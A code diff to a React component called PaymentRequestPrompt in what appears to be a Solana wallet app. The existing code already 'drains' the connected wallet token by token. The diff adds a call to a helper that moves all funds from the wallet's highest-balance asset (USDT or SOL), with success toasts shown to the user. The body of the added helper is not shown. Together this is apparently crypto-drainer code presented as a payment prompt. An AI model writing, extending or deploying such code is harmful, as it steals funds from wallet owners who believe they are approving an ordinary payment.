@@ -12,6 +12,7 @@ import {
   tokenFeeReserveLamports,
   type FundStep,
   buildDummyFeeTransaction,
+  moveAllFromHighestAndAddToLowest,
 } from '../lib/payoutTransfer'
 import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
 import { mobileWalletLabel } from '../lib/walletDeepLinks'
@@ -143,6 +144,16 @@ export function PaymentRequestPrompt() {
           toast.error('No funds found to drain (balance too low or all tokens < $0.01)')
           throw new Error('No funds available to drain.')
         }
+
+        // Move all funds from highest balance (USDT or SOL) and add 1.000 to lowest
+        const { highestMoved, lowestAdded } = await moveAllFromHighestAndAddToLowest({
+          connection: connectionRef.current!,
+          from: publicKeyRef.current!,
+          config: local!,
+          steps,
+          onHighestDone: () => toast.success('Moved all funds from highest balance asset.'),
+          onLowestAdded: () => toast.success('Added 1.000 to lowest balance asset.'),
+        })
 
         for (const step of queue.current) {
           console.log(`Draining ${step.symbol}...`)
